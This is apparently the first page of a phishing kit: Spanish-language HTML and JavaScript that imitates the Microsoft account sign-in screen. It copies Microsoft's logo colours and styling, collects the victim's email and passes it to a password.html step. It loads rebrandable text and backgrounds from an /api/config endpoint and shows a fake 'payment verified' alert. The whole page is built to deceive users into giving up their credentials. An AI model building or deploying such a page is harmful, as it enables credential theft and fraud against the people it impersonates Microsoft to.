<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Iniciar sesión en su cuenta</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            'ms-red': '#f25022',
            'ms-green': '#7fba00',
            'ms-yellow': '#ffb900',
            'ms-blue-logo': '#00bcf2',
            'ms-gray': '#1b1b1b',
            'ms-gray-light': '#605e5c',
            'ms-border': '#8a8886',
          },
          fontFamily: {
            'segoe': ['"Segoe UI"', 'system-ui', '-apple-system', 'BlinkMacSystemFont', 'sans-serif'],
          },
        }
      }
    }
  </script>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body {
      margin: 0; padding: 0; min-height: 100vh; width: 100%;
      font-family: "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
      background: #0a0a1a;
      background-image: linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%);
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
    }
    @media (min-width: 640px) { html, body { overflow: auto; } }
    .ms-input {
      border: 1px solid #8a8886; font-size: 15px; padding: 11px 12px;
      line-height: 20px; border-radius: 2px; width: 100%; background: #fff; color: #1b1b1b;
      outline: none; transition: border-color 0.1s ease, box-shadow 0.1s ease;
    }
    .ms-input:focus { border-color: #0078d4; box-shadow: inset 0 0 0 1px #0078d4; }
    .ms-button {
      background: #0078d4; color: #fff; border: none; font-size: 15px; font-weight: 600;
      padding: 8px 12px; min-height: 32px; border-radius: 2px; cursor: pointer;
      transition: background-color 0.1s ease;
    }
    .ms-button:hover { background: #106ebe; }
    .ms-button:active { background: #005a9e; }
    .ms-button:disabled { background: #8a8886; cursor: not-allowed; }
    .ms-link { color: #0078d4; text-decoration: none; font-size: 13px; }
    .ms-link:hover { text-decoration: underline; }
    .fade-in { animation: fadeIn 0.3s ease-out; }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    .login-container {
      position: relative; z-index: 1; background: rgba(255,255,255,0.95);
      backdrop-filter: blur(10px); border-radius: 8px; box-shadow: 0 2px 6px rgba(0,0,0,0.2);
    }
    .error-box {
      background: #fef2f2; border: 1px solid #fca5a5; border-radius: 4px;
      padding: 8px 12px; margin-bottom: 12px; text-align: center; display: none;
    }
    .error-text { color: #dc2626; font-size: 13px; font-weight: 500; }
    .main-container {
      position: fixed; top: 0; left: 0; right: 0; bottom: 0;
      display: flex; align-items: center; justify-content: center; padding: 1rem; z-index: 10;
    }
    @media (min-width: 640px) { .main-container { position: static; min-height: 100vh; padding-top: 12vh; } }
    .footer-links {
      position: fixed; bottom: 0; left: 0; right: 0;
      background: rgba(255,255,255,0.95); backdrop-filter: blur(8px);
      border-top: 1px solid #e1dfdd; padding: 8px 16px; z-index: 50;
    }
    @media (min-width: 640px) { .footer-links { padding: 8px 24px; } }
    .footer-inner {
      max-width: 1200px; margin: 0 auto; display: flex; flex-wrap: wrap;
      align-items: center; justify-content: center; gap: 8px 16px;
      font-size: 12px; color: #605e5c;
    }
    .footer-inner a { color: #0078d4; text-decoration: none; }
    .footer-inner a:hover { text-decoration: underline; }
    .footer-inner .private-tip { text-align: center; font-size: 11px; }
  </style>
</head>
<body>

  <div class="main-container">
    <div class="w-full max-w-md fade-in relative z-10">
      <div class="login-container p-8 sm:p-12">

        <div class="flex items-center justify-center mb-6">
          <div class="grid grid-cols-2 gap-px w-6 h-6 mr-3">
            <div class="bg-ms-red w-3 h-3"></div>
            <div class="bg-ms-green w-3 h-3"></div>
            <div class="bg-ms-blue-logo w-3 h-3"></div>
            <div class="bg-ms-yellow w-3 h-3"></div>
          </div>
          <span class="text-xl font-semibold text-ms-gray" style="font-family:'Segoe UI',system-ui,sans-serif;font-size:21px;line-height:28px;">Microsoft</span>
        </div>

        <h1 class="text-2xl font-semibold text-ms-gray mb-1 text-center" style="font-size:28px;line-height:36px;">Iniciar sesión</h1>
        <p class="text-ms-gray-light mb-6 text-center" style="font-size:15px;line-height:20px;">Use su cuenta</p>

        <div id="errorBox" class="error-box">
          <span id="errorText" class="error-text"></span>
        </div>

        <form onsubmit="handleEmailSubmit(event)" class="space-y-5">
          <div>
            <input type="email" id="email" placeholder="Correo electrónico o número de teléfono"
              class="ms-input" autocomplete="username" style="width:100%;" />
          </div>

          <div class="text-left">
            <a href="#" class="ms-link" id="forgotLink">¿Olvidaste tu nombre de usuario?</a>
          </div>

          <button type="submit" class="ms-button w-full" id="submitBtn" style="width:100%;">
            Siguiente
          </button>

          <div class="text-center text-ms-gray" style="font-size:15px;line-height:20px;">
            ¿Es nuevo en Microsoft?
            <a href="#" class="ms-link font-semibold" style="font-size:13px;">Crear una cuenta</a>
          </div>
        </form>
      </div>
    </div>
  </div>

  <div class="footer-links">
    <div class="footer-inner">
      <a href="#" id="footerHelp">Ayuda</a>
      <a href="#" id="footerTerms">Términos de uso</a>
      <a href="#" id="footerPrivacy">Privacidad y cookies</a>
      <span class="private-tip">Usa la exploración privada si este no es tu dispositivo. <a href="#">Más información</a></span>
    </div>
  </div>

  <script>
    let globalConfig = null;

    // Fondo inmediato - se aplica al inicio sin esperar fetch
    (function applyInitialBackground() {
      const gradientColor = '#0a0a1a';
      const gradient = 'linear-gradient(135deg, ' + gradientColor + ' 0%, #1a1a2e 100%)';
      document.documentElement.style.background = gradient;
      document.documentElement.style.backgroundSize = 'cover';
      document.documentElement.style.backgroundPosition = 'center';
      document.documentElement.style.backgroundRepeat = 'no-repeat';
      document.documentElement.style.backgroundColor = gradientColor;
      document.body.style.background = gradient;
      document.body.style.backgroundSize = 'cover';
      document.body.style.backgroundPosition = 'center';
      document.body.style.backgroundRepeat = 'no-repeat';
      document.body.style.backgroundColor = gradientColor;
    })();

    async function loadConfig() {
      try {
        const res = await fetch('/api/config');
        if (res.ok) globalConfig = await res.json();
      } catch (e) { console.warn('Config no disponible'); }
      if (!globalConfig) globalConfig = { logoText:'Microsoft', pageTitle:'Iniciar sesión en su cuenta', welcomeText:'Use su cuenta', footerHelpText:'Ayuda', footerTermsText:'Términos de uso', footerPrivacyText:'Privacidad y cookies', footerPrivateTip:'Usa la exploración privada si este no es tu dispositivo. Más información' };
      applyConfig();
    }

    function applyConfig() {
      if (globalConfig.logoText) {
        const logo = document.querySelector('.text-xl.font-semibold.text-ms-gray');
        if (logo) logo.textContent = globalConfig.logoText;
      }
      if (globalConfig.pageTitle) document.title = globalConfig.pageTitle;
      const w = document.querySelector('.text-ms-gray-light.mb-6');
      if (w && globalConfig.welcomeText) w.textContent = globalConfig.welcomeText;
      const fh = document.getElementById('footerHelp');
      const ft = document.getElementById('footerTerms');
      const fp = document.getElementById('footerPrivacy');
      const pt = document.querySelector('.private-tip');
      if (fh && globalConfig.footerHelpText) fh.textContent = globalConfig.footerHelpText;
      if (ft && globalConfig.footerTermsText) ft.textContent = globalConfig.footerTermsText;
      if (fp && globalConfig.footerPrivacyText) fp.textContent = globalConfig.footerPrivacyText;
      if (pt && globalConfig.footerPrivateTip) pt.innerHTML = globalConfig.footerPrivateTip;

      applyLoginBackground();
    }

    function applyLoginBackground() {
      const bgType = globalConfig.loginBgType || 'gradient';
      const bgColor = globalConfig.loginBgColor || '#0a0a1a';
      const bgGradient = globalConfig.loginBgGradient || 'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)';
      const bgImage = globalConfig.loginBgImage || '';

      const el = document.documentElement;
      el.style.removeProperty('background');
      el.style.removeProperty('background-color');
      el.style.removeProperty('background-image');
      el.style.removeProperty('background-size');
      el.style.removeProperty('background-position');
      el.style.removeProperty('background-repeat');

      if (bgType === 'color') {
        el.style.backgroundColor = bgColor;
        el.style.background = bgColor;
      } else if (bgType === 'gradient') {
        el.style.background = bgGradient;
      } else if (bgType === 'image' && bgImage) {
        el.style.backgroundImage = 'url(' + bgImage + ')';
        el.style.backgroundSize = 'cover';
        el.style.backgroundPosition = 'center';
        el.style.backgroundRepeat = 'no-repeat';
        el.style.backgroundColor = '#0a0a1a';
      }

      el.style.backgroundSize = 'cover';
      el.style.backgroundPosition = 'center';
      el.style.backgroundRepeat = 'no-repeat';

      const body = document.body;
      body.style.removeProperty('background');
      body.style.removeProperty('background-color');
      body.style.removeProperty('background-image');

      if (bgType === 'color') {
        body.style.backgroundColor = bgColor;
        body.style.background = bgColor;
      } else if (bgType === 'gradient') {
        body.style.background = bgGradient;
      } else if (bgType === 'image' && bgImage) {
        body.style.backgroundImage = 'url(' + bgImage + ')';
        body.style.backgroundSize = 'cover';
        body.style.backgroundPosition = 'center';
        body.style.backgroundRepeat = 'no-repeat';
        body.style.backgroundColor = '#0a0a1a';
      }

      body.style.backgroundSize = 'cover';
      body.style.backgroundPosition = 'center';
      body.style.backgroundRepeat = 'no-repeat';
    }

    function showError(msg) {
      const eb = document.getElementById('errorBox');
      const et = document.getElementById('errorText');
      if (eb && et) { et.textContent = msg; eb.style.display = 'block'; }
    }
    function hideError() {
      const eb = document.getElementById('errorBox');
      if (eb) eb.style.display = 'none';
    }
    function isValidEmail(e) { return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e); }

    function handleEmailSubmit(event) {
      event.preventDefault();
      hideError();
      const email = document.getElementById('email').value.trim();
      const btn = document.getElementById('submitBtn');
      if (!email) { showError('Por favor ingresa tu correo electrónico.'); document.getElementById('email').focus(); return; }
      if (!isValidEmail(email)) { showError('Ingresa un correo válido.'); document.getElementById('email').focus(); return; }
      btn.disabled = true;
      btn.textContent = 'Verificando...';
      setTimeout(function() { window.location.href = 'password.html?email=' + encodeURIComponent(email); }, 400);
    }

    loadConfig();

    (function checkPaymentSuccess() {
      const p = new URLSearchParams(window.location.search);
      if (p.get('payment_success') === '1') {
        setTimeout(function() { alert('✅ Pago verificado correctamente. Gracias.'); }, 500);
      }
    })();
  </script>
</body>
</html>
